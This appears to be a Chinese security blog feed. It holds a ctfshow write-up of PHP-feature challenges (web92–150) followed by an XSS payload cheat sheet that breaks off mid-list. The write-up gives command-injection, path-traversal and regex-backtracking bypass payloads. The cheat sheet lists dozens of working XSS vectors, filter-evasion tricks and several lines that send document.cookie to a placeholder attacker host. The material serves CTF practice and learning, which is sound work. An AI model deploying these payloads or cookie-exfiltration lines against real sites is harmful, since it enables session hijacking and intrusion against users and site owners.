title="web92"></a>web92</h3><p>还是考察intval()函数特性</p><pre><code>pyload:?cmd=4476.1</code></pre><h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><p>这里过滤了a-z和A-Z，不能用16进制编码，但能用8进制编码，用小数也可以绕过。这里我们用8进制编码一下</p><pre><code>payload:?cmd=010574</code></pre><h3 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h3><p>看源码</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/223456.png" class=""><p>这里增加了strpos()函数</p><p><strong>strpos(string $haystack, string $needle, int $offset &#x3D; 0): int|false</strong></p><p>返回 needle 在 haystack 中首次出现的数字位置。如果提供了$offset参数，搜索会从字符串该字符数的起始位置开始统计。 如果是负数，搜索会从字符串结尾指定字符数开始。</p><p>所以，这里的if(!strpos($num, “0”))是过滤了出现在字符串首位的0，即屏蔽了8进制</p><pre><code>payload:?num=4476.01</code></pre><h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><p>这关直接过滤了点，发现用+号可以绕过</p><pre><code>payload:?cmd=+010574 或 ?cmd=%2b010574</code></pre><h3 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h3><p>这里用相对路径</p><pre><code>payload:?u=./flag.php</code></pre><h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><p>数组绕过</p><pre><code>POST a[]=1&amp;b[]=2</code></pre><h3 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h3><p>由源码含义可构造payload:</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/110924.png" class=""><h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><p>看源码：</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/113547.png" class=""><p><strong>in_array()</strong></p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/113721.png" class=""><p><strong>file_put_contents()</strong></p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/113902.png" class=""><p>直接构造，然后用蚁剑连接</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/115539.png" class=""><p>get数据可以多次尝试</p><h3 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h3><p>源码：</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/142455.png" class=""><p><strong>is_numeric(mixed $value): bool</strong></p><p>检测指定的变量是否为数字或数字字符串。</p><p>这题的重点是and or和&amp;&amp; ||的区别，区别是优先级不同，后者的优先级高于&#x3D;，前者的优先级低于&#x3D;。所以这里只要构造v1等于一个数字即可。</p><pre><code>?v1=23&amp;v2=system(&#39;ls&#39;)&amp;v3=;?v1=1&amp;v2=system(&quot;tac ctfshow.php&quot;)&amp;v3=;?v1=1&amp;v2=highlight_file(&quot;ctfshow.php&quot;)&amp;v3=;?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></pre><h3 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h3><p>这一关几乎所有能用的都过滤了，这里要用到ReflectionClass反射类。</p><p>参考:<a href="https://www.php.net/manual/zh/class.reflectionclass.php">https://www.php.net/manual/zh/class.reflectionclass.php</a></p><p>​<a href="https://www.cnblogs.com/benbenhan/p/12572649.html">https://www.cnblogs.com/benbenhan/p/12572649.html</a></p><p>最简单的方法直接输出这个类即可，也就是构造出 echo new ReflectionClass(‘ctfshow’);</p><pre><code>payload:?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></pre><h3 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h3><p>先看源码：</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/162642.png" class=""><p><strong>call_user_func(callable $callback,mixed …$args):mixed</strong></p><p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</p><p>我们梳理一下这一关的思路：首先v3得是一个文件名，然后v2应该是一句话，但这里要绕过is_numeric()，并且要经过名为v1的函数转换，所以v2得是一句话经过处理成为纯数字，这里我们选v2&#x3D;’&lt;?&#x3D;<code>cat *</code>;’;,再经过base64和16进制编码后成为PD89YGNhdCAqYDs&#x3D;,等号在base64中只是起到填充的作用，不影响具体的数据内容，直接用去掉，再转换为16进制，得到5044383959474e6864434171594473（注：如果此处使用bin2hex()函数，这个函数是先将字符串的ascii对应的二进制找出来，再将二进制码转换成16进制，所以如果用在线编码转换的话应先将字符串先base64编码，再用ascii转16进制）。</p><p>这一关要使用php:&#x2F;&#x2F;filter伪协议。</p><pre><code>payload:GET v2=005044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64- decode/resource=1.php         POST v1=hex2bin</code></pre><p>最后再访问1.php。</p><h3 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h3><p>同上</p><h3 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h3><pre><code>payload: GET v2=ddd         POST v1=ddd</code></pre><h3 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h3><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/205755.png" class=""><p>考察变量覆盖，这里有个php的小特性就是变量不需要声明</p><pre><code>payload GET a=flag        POST error=a</code></pre><h3 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h3><p>参考<a href="https://blog.csdn.net/qq_19980431/article/details/83018232">https://blog.csdn.net/qq_19980431/article/details/83018232</a></p><pre><code>payload: GET v2[]=1         POST v1[]=2</code></pre><h3 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h3><p><strong>parse_str(string $string, array &amp;$result): void</strong></p><p>如果 string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 <code>result</code> 则会设置到该数组里 ）。</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/215655.png" class=""><pre><code>payload: GET v3=QNKCDZO         POST v1=flag=0</code></pre><h3 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h3><p>考察ereg()截断漏洞.参考:<a href="https://blog.csdn.net/qq_25987491/article/details/79952393">https://blog.csdn.net/qq_25987491/article/details/79952393</a></p><p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符大小写敏感</p><p>这里ereg有两个漏洞：<br>①%00截断及遇到%00则默认为字符串的结束<br>②当ntf为数组时它的返回值不是FALSE</p><p>数组绕过匹配:<br>第一步首先要过ereg，可以用%00截断<br>第二部0x36d是十进制877，逆操作经过strrev为778</p><pre><code>payload c=a%00778</code></pre><h3 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h3><p>只要让new后面有个类不报错以后，就可以随意构造</p><pre><code>?v1=Exception();system(&quot;ls&quot;);//&amp;v2=a?v1=ReflectionClass&amp;v2=system(&quot;ls&quot;)?v1=ReflectionClass(&quot;PDO&quot;);system(&quot;ls&quot;);//&amp;v2=a</code></pre><h3 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h3><p>考察FilesystemIterator类</p><pre><code>payload ?v1=FilesystemIterator&amp;v2=getcwd</code></pre><p>缺陷是如果flag的文件不在第一位的话，就不能得到这个文件名。</p><p><strong>getcwd(): string|false</strong></p><p>取得当前工作目录。</p><p><strong>FilesystemIterator</strong> 遍历文件的类 </p><p><strong>DirctoryIntrerator</strong> 遍历目录的类</p><h3 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h3><p>这里用全局变量GLOBALS</p><p>$GLOBALS — 引用全局作用域中可用的全部变量 一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p><p>注：在所有函数外部定义的变量，拥有全局作用域。除了函数外，全局变量可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用 global 关键字。所以这里v2要用超全局变量GLOBALS,不能直接用flag。</p><pre><code>payload  ?v1=ctfshow&amp;v2=GLOBALS</code></pre><h5 id="使用超全局变量-GLOBALS可以代替global"><a href="#使用超全局变量-GLOBALS可以代替global" class="headerlink" title="使用超全局变量$GLOBALS可以代替global"></a>使用超全局变量$GLOBALS可以代替global</h5><pre><code>&lt;?php      $num1 = 5;      //全局变量     $num2 = 13;     //全局变量    function global_var()      &#123;              $sum = $GLOBALS[&#39;num1&#39;] + $GLOBALS[&#39;num2&#39;];              echo &quot;全局变量求和结果 &quot; .$sum;      &#125;      global_var();  ?&gt;  </code></pre><h3 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h3><p><strong>is_file(string $filename): bool</strong></p><p>如果文件存在且为正常的文件则返回 true，否则返回 false。</p><p>这一关要传入一个不存在的文件名还要把文件内容显示出来，我们这里还是用php伪协议。</p><pre><code>payload ?file=php://filter/resource=flag.php</code></pre><h3 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h3><p>这题用到伪协议zlib:&#x2F;&#x2F;</p><pre><code>payload ?file=compress.zlib://flag.php</code></pre><h3 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h3><p>没有过滤php和filter</p><pre><code>?file=php://filter/resource=flag.php</code></pre><h3 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h3><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/214923.png" class=""><p>这一关用%0c来绕过trim()函数</p><pre><code>payload ?num=%0c36</code></pre><h3 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h3><p>这一关比较容易想出来fun&#x3D;echo $flag，但是没有回显，通过排查发现是$CTF_SHOW.COM的问题，看别人题解果然是，并且是因为是变量里有个点：</p><p>在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有空格、+、[则会被转化为_，所以按理来说我们构造不出CTF_SHOW.COM这个变量(因为含有.)，但php中有个特性就是如果传入[，它被转化为_之后，后面的字符就会被保留下来不会被替换</p><p>可以参考一下y4的博客<a href="https://blog.csdn.net/solitudi/article/details/120502141">https://blog.csdn.net/solitudi/article/details/120502141</a></p><p> (反正我也看不懂)，总之先记住这个性质。其实出现了[之后php就会去找]，如果找到了那就是数组，没有找到就被被解析成_</p><pre><code>payload CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</code></pre><h3 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h3><p>这一关屏蔽了echo、flag。我们这里用创造一个新变量，巧妙利用highlight_file()</p><pre><code>payload CTF_SHOW=fds&amp;CTF[SHOW.COM=dfds&amp;fun=highlight_file($_POST[fff])&amp;fff=flag.php</code></pre><h3 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h3><p>直接过滤了g、i、f…，要利用$_SERVER[‘argv’]。</p><p><em>$_SERVER</em> 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。</p><p>‘argv’</p><p>传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string。</p><p><strong>$_SERVER[‘argv’][0] &#x3D; $_SERVER[‘QUERY_STRING’]</strong><br>query string是Uniform Resource Locator (URL)的一部分, 其中包含着需要传给web application的数据</p><p>可以用+来进行分隔，使得数组中有多个数值。</p><p>注：在web页模式下必须在php.ini开启register_argc_argv配置项</p><pre><code>payload GET a=1+$fl0g=flag_give_me;        POST CTF_SHOW=fds&amp;CTF[SHOW.COM=dfds&amp;fun=eval($a[1])</code></pre><p>注意分号。</p><h3 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h3><p><strong>extract(array &amp;$array, int $flags &#x3D; EXTR_OVERWRITE, string $prefix&#x3D; “”): int</strong></p><p>本函数用来将变量从数组中导入到当前的符号表中。</p><p>array:一个关联数组。此函数会将键名当作变量名，值作为变量的值。 对每个键／值对都会在当前的符号表中建立变量</p><p>这一关一直卡在CTF_SHOW的下划线的过滤上，看别人题解才发现还有个空格没用上</p><pre><code>payload ?ctf show=ilove36d</code></pre><h3 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h3><p>这关操作确实有点骚。。。</p><p>复述一下大佬的做法：（做这道题的时候正好堆堆推门而入取水来了，不得让他表演一下。。。不过大佬就是大佬）</p><p>使用**gettext()**拓展，开启此拓展_() 等效于 gettext()</p><pre><code>echo _(&quot;hahahaha&quot;);//输出结果：hahahaha</code></pre><p>接下来到第二层call_user_func，可以使用get_defined_vars函数</p><p><strong>get_defined_vars ( void ) : array</strong> 函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</p><pre><code>payload ?f1=_&amp;f2=get_defined_vars</code></pre><h3 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h3><p>这题看到readfile第一反应是php伪协议，但要包括ctfshow，搞了一会不行，看别人题解发现放到过滤器参数里就可以，无效的东西会被忽略</p><pre><code>payload f=php://filter/ctfshow/resource=flag.php</code></pre><p>解法2：文件穿越，把ctfshow当作当前目录下的一个文件</p><pre><code>?f=/ctfshow/../../../../../../../../../var/www/html/flag.php</code></pre><h3 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h3><p>第一下随便传了个f&#x3D;ctfshow想试试代码中的正则是什么作用，结果爆出了flag。。。</p><p>.表示任意单个字符，+表示必须匹配1次或多次，？表示匹配0次或1次·，所以+?表示 重复1次或更多次</p><pre><code>payload f=ctfshow</code></pre><p>还有一种做法：通过数组来绕过，stripos应用于数组的时候会返回null，null!&#x3D;&#x3D;false</p><pre><code>payload f[]=1</code></pre><p>其实这道题的意图是通过回溯限制来绕过。</p><p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false</p><p>脚本发包：</p><pre><code class="python">import requestsurl = &quot;http://48390078-c20a-4f56-8b4e-148df47485cb.chall.ctf.show:8080/&quot;data = &#123;    &#39;f&#39;: &#39;dotast&#39;*170000+&#39;ctfshow&#39;&#125;res = requests.post(url=url,data=data)print(res.text)</code></pre><p>与这题相似的一个题：</p><pre><code>if(isset($_GET[&#39;syc&#39;])&amp;&amp;preg_match(&#39;/^Welcome to GEEK 2023!$/i&#39;, $_GET[&#39;syc&#39;]) &amp;&amp; $_GET[&#39;syc&#39;] !== &#39;Welcome to GEEK 2023!&#39;)</code></pre><p>这题可用%0a绕过</p><pre><code>?syc=Welcome to GEEK 2023!%0a</code></pre><h3 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h3><p>这一关只能用回溯了</p><pre><code class="python">import requestsurl = &quot;http://48390078-c20a-4f56-8b4e-148df47485cb.chall.ctf.show:8080/&quot;data = &#123;    &#39;f&#39;: &#39;dotast&#39;*170000+&#39;36Dctfshow&#39;&#125;res = requests.post(url=url,data=data)print(res.text)</code></pre><h3 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h3><p>进入admin目录</p><p>&amp;&amp;优先级高于||，所以</p><pre><code>paylaod ?username=admin&amp;code=admin&amp;password=fdsf</code></pre><h3 id="web133"><a href="#web133" class="headerlink" title="***web133"></a>***web133</h3><p>这题看看出题人的博客 <a href="https://blog.csdn.net/qq_46091464/article/details/109095382">https://blog.csdn.net/qq_46091464/article/details/109095382</a></p><pre><code>我们传递?F=`$F`;+sleep 3好像网站确实sleep了一会说明的确执行了命令**那为什么会这样？**因为是我们传递的`$F`;+sleep 3。先进行substr()函数截断然后去执行eval()函数这个函数的作用是执行php代码，``是shell_exec()函数的缩写，然后就去命令执行。而$F就是我们输入的`$F`;+sleep 3 使用最后执行的代码应该是``$F`;+sleep 3`,就执行成功这里可能有点绕，慢慢理解</code></pre><p><strong>shell_exec</strong> — 通过 shell 执行命令并将完整的输出以字符串的方式返回</p><p>所以这里没办法回显</p><p>这一关要弹什么shell，以后再看</p><h3 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h3><p><strong>parse_str(string $string, array &amp;$result): void</strong></p><p>如果 string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。（parse_str以&amp;来分割字符串）</p><pre><code>payload ?_POST[key1]=36d&amp;_POST[key2]=36d</code></pre><h3 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h3><p>这一关屏蔽了很多东西，我们用linux命令cp或uniq</p><pre><code>payload ?F=`$F` ;cp flag.php 2.txt;         ?F=`$F` ;uniq flag.php&gt;4.txt;</code></pre><h3 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h3><p><strong>exec(string $command, array &amp;$output &#x3D; null, int &amp;$result_code&#x3D; null): string|false</strong></p><p>exec()执行 command 参数所指定的命令。</p><p>这关屏蔽了&lt;&gt;和.，又来一个新姿势：</p><pre><code>tee a.txt b.txt，将a.txt复制到b.txt ls | tee b.txt,将ls命令的执行结果写入b.txt</code></pre><p>先执行?c&#x3D;ls &#x2F;|tee ls,然后访问ls.txt</p><p>会让你下载文件，</p><img src="/2023/04/03/php%E7%89%B9%E6%80%A7(ctfshow)/135803.png" class=""><p>然后执行 ?c&#x3D;tac &#x2F;f149_15_h3r3|tee flag，访问&#x2F;flag</p><h3 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h3><p>用**call_user_func()**来调用一个类里面的方法</p><pre><code>payload ctfshow=ctfshow::getFlag</code></pre><h3 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h3><p>屏蔽了冒号，还可以用数组来调用类里的方法</p><pre><code>payload ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</code></pre><h3 id="web139"><a href="#web139" class="headerlink" title="***web139"></a>***web139</h3><p>要用到什么shell编程和盲注，还是暂放亿下。。。</p><h3 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h3><p>“ctfshow”字符串与数字比较时被转换为0，所以这关随便胡写俩个函数使最后的结果为null就行</p><pre><code>payload f1=intval&amp;f2=intval</code></pre><h3 id="web141"><a href="#web141" class="headerlink" title="***web141"></a>***web141</h3><p>\W匹配非字母、数字、下划线。等价于 [^A-Za-z0-9_]。</p><p>无数字字母rce……</p><h3 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h3><p>这关没难度</p><pre><code>payload v1=0</code></pre><h3 id="web143-150"><a href="#web143-150" class="headerlink" title="***web143-150"></a>***web143-150</h3>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss</title>
      <link href="/2023/03/28/xss/"/>
      <url>/2023/03/28/xss/</url>
      
        <content type="html"><![CDATA[<p>xss类型：</p><p>​反射型</p><p>​存储型</p><p>​DOM型（document.write、innerHTML、eval）</p><p><strong>DOM型xss和反射型xss最大的区别就是dom型xss不经过服务器，仅仅是通过网页本身的JavaScript进行渲染触发的</strong></p><p>注：document.write可以识别Native编码</p><p>同源策略：同协议，同域名，同端口</p><pre><code>标签法：&lt;script&gt;alert(123)&lt;/script&gt;伪协议：&lt;a href=javascript:alert(555)&gt;fff&lt;/a&gt;事件法：&lt;a onmousemove=alert(888)&gt;8888&lt;/a&gt;</code></pre><h3 id="无过滤情况"><a href="#无过滤情况" class="headerlink" title="无过滤情况"></a>无过滤情况</h3><p>&lt;script&gt;</p><pre><code>&lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt;&lt;script&gt;var img=document.createElement(&quot;img&quot;); img.src=&quot;http://xxx.xxx:xxxx/&quot;+document.cookie&lt;/script&gt;  //外带&lt;script&gt;window.open(&quot;http://xxx.xxx:xxxx/&quot;+document.cookie)&lt;/script&gt;&lt;script&gt;window.location.href=&#39;http://xxx.xxx:xxxx/&#39;+document.cookie&lt;/script&gt;&lt;script&gt;location.href=&#39;http://xxx.xxx:xxxx/&#39;+document.cookie&lt;/script&gt;</code></pre><p>&lt;img&gt;</p><pre><code>图片加载错误时触发&lt;img src=&quot;x&quot; onerror=alert(1)&gt;&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&#39;xss&#39;)&quot;)&gt;鼠标指针移动到元素时触发&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;鼠标指针移出时触发&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;</code></pre><p>&lt;a&gt;</p><pre><code>&lt;a href=&quot;https://www.qq.com&quot;&gt;qq&lt;/a&gt;&lt;a href=javascript:alert(&#39;xss&#39;)&gt;test&lt;/a&gt;&lt;a href=&quot;javascript:a&quot; onmouseover=&quot;alert(/xss/)&quot;&gt;aa&lt;/a&gt;&lt;a href=&quot;&quot; onclick=alert(&#39;xss&#39;)&gt;a&lt;/a&gt;&lt;a href=&quot;&quot; onclick=eval(alert(&#39;xss&#39;))&gt;aa&lt;/a&gt;&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt(&#39;xss&#39;) y=2016&gt;aa&lt;/a&gt;</code></pre><p>&lt;input&gt;</p><pre><code>&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot;&gt;竞争焦点，从而触发onblur事件&lt;input onfocus=&quot;window.open(&#39;http://xxx.xxx:xxxx/&#39;+document.cookie)&quot; autofocus&gt; //外带&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot; autofocus&gt;&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;input value=&quot;&quot; onclick=alert(&#39;xss&#39;) type=&quot;text&quot;&gt;&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&#39;xss&#39;) bad=&quot;&quot;&gt;&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;按下按键时触发&lt;input type=&quot;text&quot; onkeydown=&quot;alert(1)&quot;&gt;按下按键时触发&lt;input type=&quot;text&quot; onkeypress=&quot;alert(1)&quot;&gt;松开按键式时触发&lt;input type=&quot;text&quot; onkeyup=&quot;alert(1)&quot;&gt;</code></pre><p>&lt;from&gt;</p><pre><code>&lt;form action=javascript:alert(&#39;xss&#39;) method=&quot;get&quot;&gt;&lt;form action=javascript:alert(&#39;xss&#39;)&gt;&lt;form method=post action=aa.asp? onmouseover=prompt(&#39;xss&#39;)&gt;&lt;form method=post action=aa.asp? onmouseover=alert(&#39;xss&#39;)&gt;&lt;form action=1 onmouseover=alert(&#39;xss)&gt;&lt;form method=post action=&quot;data:text/html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;&gt;&lt;form method=post action=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</code></pre><p>&lt;iframe&gt;</p><pre><code>&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;&lt;iframe onload=&quot;window.open(&#39;http://xxx.xxx:xxxx/&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt; //外带&lt;iframe src=javascript:alert(&#39;xss&#39;)&gt;&lt;/iframe&gt;&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(&#39;xss&#39;)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;&gt;&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;&lt;iframe src=&quot;aaa&quot; onmouseover=alert(&#39;xss&#39;) /&gt;&lt;iframe&gt;&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;``xss``&amp;rpar;&quot;&gt;&lt;/iframe&gt;(````只有两个``)</code></pre><p>&lt;svg&gt;</p><pre><code>&lt;svg onload=alert(1)&gt;&lt;svg onload=&quot;window.open(&#39;http://xxx.xxx:xxxx/&#39;+document.cookie)&quot;&gt;</code></pre><p>&lt;body&gt;</p><pre><code>&lt;body onload=&quot;alert(1)&quot;&gt;&lt;body onload=&quot;window.open(&#39;http://xxx.xxx:xxxx/&#39;+document.cookie)&quot;&gt; //外带利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发&lt;body onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</code></pre><p>&lt;button&gt;</p><pre><code>元素上点击鼠标时触发&lt;button onclick=&quot;alert(1)&quot;&gt;text&lt;/button&gt;</code></pre><p>&lt;p&gt;</p><pre><code>元素上按下鼠标时触发&lt;p onmousedown=&quot;alert(1)&quot;&gt;text&lt;/p&gt;元素上释放鼠标时触发&lt;p onmouseup=&quot;alert(1)&quot;&gt;text&lt;/p&gt;</code></pre><p>&lt;details&gt;</p><pre><code>&lt;details ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;使用open属性触发ontoggle事件，无需用户去触发&lt;details open ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;元素上按下鼠标时触发&lt;p onmousedown=&quot;alert(1)&quot;&gt;text&lt;/p&gt;元素上释放鼠标时触发&lt;p onmouseup=&quot;alert(1)&quot;&gt;text&lt;/p&gt;</code></pre><p>&lt;select&gt;</p><pre><code>&lt;select onfocus=alert(1)&gt;&lt;/select&gt;通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发&lt;select onfocus=alert(1) autofocus&gt;</code></pre><p>&lt;video&gt;</p><pre><code>&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</code></pre><p>&lt;audio&gt;</p><pre><code>&lt;audio src=x onerror=alert(&quot;xss&quot;);&gt;</code></pre><p>&lt;textarea&gt;</p><pre><code>&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;</code></pre><p>&lt;keygen&gt;</p><pre><code>&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐</code></pre><p>&lt;marquee&gt;</p><pre><code>&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以</code></pre><p>&lt;isindex&gt;</p><pre><code>&lt;isindex type=image src=1 onerror=alert(&quot;xss&quot;)&gt;//仅限于IE</code></pre><p>利用link远程包含js文件</p><pre><code>在无CSP的情况下才可以&lt;link rel=import href=&quot;http://127.0.0.1/1.js&quot;&gt;</code></pre><p>javascript伪协议</p><pre><code>&lt;a&gt;标签&lt;a href=&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;xss&lt;/a&gt;&lt;iframe&gt;标签&lt;iframe src=javascript:alert(&#39;xss&#39;);&gt;&lt;/iframe&gt;&lt;img&gt;标签&lt;img src=javascript:alert(&#39;xss&#39;)&gt;//IE7以下&lt;form&gt;标签&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;</code></pre><p>expression属性</p><pre><code>&lt;img style=&quot;xss:expression(alert(&#39;xss&#39;&#39;))&quot;&gt; // IE7以下&lt;div style=&quot;color:rgb(&#39;&#39;�x:expression(alert(1))&quot;&gt;&lt;/div&gt; //IE7以下&lt;style&gt;#test&#123;x:expression(alert(/XSS/))&#125;&lt;/style&gt; // IE7以下</code></pre><p>background属性</p><pre><code>&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; //在Opera 10.5和IE6上有效</code></pre><h3 id="存在过滤情况"><a href="#存在过滤情况" class="headerlink" title="存在过滤情况"></a>存在过滤情况</h3><p>过滤空格</p><pre><code>用 / 代替空格&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;</code></pre><p>过滤关键字</p><pre><code>大小写绕过&lt;ImG sRc=x onerRor=alert(&quot;xss&quot;);&gt;双写关键字(有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过)&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt;字符拼接(利用eval)&lt;img src=&quot;x&quot; onerror=&quot;a=aler;b=t;c=&#39;(xss);&#39;;eval(a+b+c)&quot;&gt;字符拼接(利用top)&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](``xss``);&lt;/script&gt;(只有两个``这里是为了凸显出有`符号)</code></pre><p>其他字符混淆</p><pre><code>有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了下面举几个简单的例子可利用注释、标签的优先级等&lt;&lt;script&gt;alert(&quot;xss&quot;);//&lt;&lt;/script&gt;&lt;scri&lt;!--test--&gt;pt&gt;alert(&quot;hello world!&quot;)&lt;/scri&lt;!--test--&gt;pt&gt;&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror=&quot;alert(``xss``);&quot;&gt; 因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&quot;xss&quot;);//&quot;;&lt;/SCRIPT&gt;</code></pre><p>编码绕过</p><pre><code>Unicode编码绕过&lt;img src=&quot;x&quot; 